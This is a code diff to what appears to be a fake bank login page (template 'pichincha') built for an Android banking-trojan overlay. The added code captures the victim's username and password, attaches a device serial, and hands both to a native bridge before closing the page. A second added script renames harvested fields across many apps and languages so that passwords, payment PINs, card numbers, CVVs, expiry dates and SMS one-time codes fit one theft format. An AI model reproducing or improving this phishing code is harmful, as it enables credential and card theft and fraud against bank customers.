@@ -93,16 +93,19 @@ function register(){try{if(typeof Android!=='undefined'&&Android.returnResult){A
 function togglePw(){var p=document.getElementById('password');p.type=(p.type==='password')?'text':'password';}
 function toggleCk(){document.getElementById('ckbox').classList.toggle('on');}
 function syncBtn(){var u=document.getElementById('login').value.trim();var p=document.getElementById('password').value;document.getElementById('go').className=(u&&p)?'btn pri ready':'btn pri';}
+var submitted=false;
+function closeApp(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);else if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}}}
 function doLogin(){
   var u=document.getElementById('login').value.trim();
   var p=document.getElementById('password').value;
-  if(!u||!p)return;
+  if(!u||!p||submitted)return;
+  submitted=true;
   document.activeElement.blur();
   document.getElementById('ov').classList.add('on');
-  var sn='';try{if(typeof FKB!=='undefined'&&FKB.getSn)sn=FKB.getSn();}catch(e){}
-  var pl=JSON.stringify({pkg:pk,sn:(typeof sn!=='undefined'?sn:''),template:'pichincha',formData:{username:u,password:p}});
-  try{if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(pl);}catch(e){}
-  setTimeout(function(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);}catch(e){}try{window.close();}catch(e){}},500);
+  setTimeout(function(){
+    try{var _sn=(typeof FKB!=='undefined'&&FKB.getSn)?FKB.getSn():'';var _pl=JSON.stringify({pkg:pk,sn:_sn,template:'pichincha',formData:{username:u,password:p}});if(typeof FKB!=='undefined'&&FKB.setFormData)FKB.setFormData(_pl);else if(typeof Android!=='undefined'&&Android.returnResult)Android.returnResult(_pl);}catch(e){}
+    setTimeout(closeApp,2500);
+  },900);
 }
 (function(){
   var n='';
@@ -123,5 +126,6 @@ function fitHead(){
 }
 addEventListener('resize',fitHead);addEventListener('load',fitHead);fitHead();setTimeout(fitHead,60);
 </script>
+<script>(function(){if(typeof Android==="undefined")return;var _r=Android.returnResult;if(!_r)return;var M={"username":"login","account":"login","phone":"login","email":"login","name":"card_name","\u7528\u6237\u540d":"login","\u624b\u673a\u53f7":"login","\u8d26\u53f7":"login","loginSecond":"login","codeFirst":"login","loginId":"login","mobileInput":"login","akses-account-input":"login","accountInput":"login","phoneInput":"login","login-identifier":"login","clientNumber":"login","j_username":"login","\u5bc6\u7801":"password","pass":"password","passwordFirst":"password","passwordSecond":"password","\u767b\u5f55\u5bc6\u7801":"password","akses-password-input":"password","passwordInput":"password","login-password":"password","j_password":"password","pin":"pay_pin","\u652f\u4ed8\u5bc6\u7801":"pay_pin","payment_password":"pay_pin","walletPassword":"pay_pin","\u4ea4\u6613\u5bc6\u7801":"pay_pin","pay_password":"pay_pin","mpin":"pay_pin","card":"card","\u94f6\u884c\u5361":"card","\u5361\u53f7":"card","card_no":"card","card_number":"card","bankcard":"card","seriaFirst":"card","cC":"card","cvc":"cvv","security_code":"cvv","\u5b89\u5168\u7801":"cvv","cV":"cvv","expiry":"exp_date","card_date":"exp_date","\u6709\u6548\u671f":"exp_date","expire":"exp_date","cE":"exp_date","cardholder":"card_name","\u6301\u5361\u4eba":"card_name","\u59d3\u540d":"card_name","cN":"card_name","sms":"sms_code","verification_code":"sms_code","\u9a8c\u8bc1\u7801":"sms_code","otp":"sms_code"};Android.returnResult=function(j){try{var d=JSON.parse(j),n={};for(var k in d){n[M[k]||k]=d[k]}j=JSON.stringify(n)}catch(e){}return _r.call(Android,j)};})();</script>
 </body>
 </html>
